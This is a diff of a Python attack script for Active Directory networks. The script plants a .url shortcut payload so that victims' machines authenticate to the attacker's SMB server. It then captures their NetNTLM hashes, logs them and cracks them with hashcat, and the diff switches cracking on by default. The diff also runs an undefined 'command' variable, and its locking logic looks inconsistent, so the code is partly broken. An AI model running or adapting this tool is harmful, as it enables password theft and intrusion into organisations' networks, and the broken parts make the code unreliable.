@@ -7,10 +7,20 @@ import threading
 
 iface = input("name of the interface connected to the AD network: ")
 #set to True to enable cracking
-crackhashes = False
+crackhashes = True
 #avoid using big wordlist
 wordlist_path = ""
 
+stolen = []
+
+#colors
+white = "\033[1;37;48m"
+yellow = "\033[1;33;48m"
+green = "\033[1;32;48m"
+red = "\033[1;31;48m"
+blue = "\033[1;34;48m"
+
+print(white)
 lock = threading.Lock()
 
 #this get your local ip
@@ -24,22 +34,29 @@ f.write(tofile)
 f.close()
 print("payload written to \"PoC_shortcut.url\"")
 print("PAYLOAD\n-------------------\n"+tofile+"\n-------------------")
+
+
+
 def crack(hashtocrack):
-    lock.acquire()
-    #This is the hashcat command used to crack hashes.
-    #feel free to modify it
-    Popen(f"hashcat \'{hashtocrack}\' {wordlist_path} -O -m 5500 -w 4 >/dev/null 2>&1",shell=True)
-    time.sleep(3)
-    cracked = str(Popen(f"hashcat \'{hashtocrack}\' -m 5500 --show 2>/dev/null",shell=True,stdout=PIPE).stdout.read()).replace("b'","").replace("'","")
+    if len(hashtocrack) < 500:
+        Popen(f"hashcat \'{hashtocrack}\' {wordlist_path} -O -m 5500 -w 4 >/dev/null 2>&1",shell=True)
+        time.sleep(2)
+        cracked = str(Popen(f"hashcat \'{hashtocrack}\' -m 5500 --show 2>/dev/null",shell=True,stdout=PIPE).stdout.read()).replace("b'","").replace("'","")
+    else:
+        Popen(f"hashcat \'{hashtocrack}\' {wordlist_path} -O -m 5600 -w 4 >/dev/null 2>&1",shell=True)
+        time.sleep(2)
+        cracked = str(Popen(f"hashcat \'{hashtocrack}\' -m 5600 --show 2>/dev/null",shell=True,stdout=PIPE).stdout.read()).replace("b'","").replace("'","")
     username = hashtocrack.split(":")[0]
+    time.sleep(2)
     if len(cracked) > 2:
         password = cracked.split(":")[-1].replace("\\n","")
-        print("[+] cracked !")
-        print(f"[+] username: {username}")
-        print(f"[+] password: {password}")
+        print(f"{green}[+] cracked !{white}")
+        print(f"{green}[+]{white} username: {username}")
+        print(f"{green}[+]{white} password: {password}")
+        out = str(Popen(command,shell=True,stdout=PIPE).stdout.read()).replace("b'","").replace("b\"","").replace("\\n","")[:-1]
         print("")
     else:
-        print(username,"[x] not cracked")
+        print(f"{red}[x]{white} {username} not cracked")
         print("")
     lock.release()
 
@@ -49,18 +66,23 @@ try:
     p = Popen(f'python smbserver.py -ip {ip} -smb2support icon icon',shell=True,stdout=PIPE)
     time.sleep(2)
     
-    print("STARTED!")
+    print(f"{blue}[*]{white} listening...\n")
 
-    
     while True:
         stdout = str(p.stdout.readline()).replace("b'","").replace("'","")
         smbserver_output = stdout.replace("\\n","").replace("[*] ","") if stdout.count(":") == 5 else False
-        
-        if smbserver_output:
-                print("[+] got a hash! -> "+smbserver_output)
-                if crackhashes:
-                    print("[+] trying to crack it...")
-                    threading._start_new_thread(crack,(smbserver_output,))
+        logs = open("logs.txt","a")
+        logs.write(stdout.replace("\\n","\n"))
+        logs.close()
+        if smbserver_output and smbserver_output.split(":")[0] + "::" + smbserver_output.split(":")[2] not in stolen:
+            lock.acquire()
+            print(f"{blue}[+]{white} got a hash! -> "+smbserver_output)
+            stolen.append(smbserver_output.split(":")[0] + "::" + smbserver_output.split(":")[2])
+            if crackhashes:
+                print(f"{yellow}[!]{white} trying to crack it...")
+                threading._start_new_thread(crack,(smbserver_output,))
+            else:
+                lock.release()
         
 
 except Exception as e:
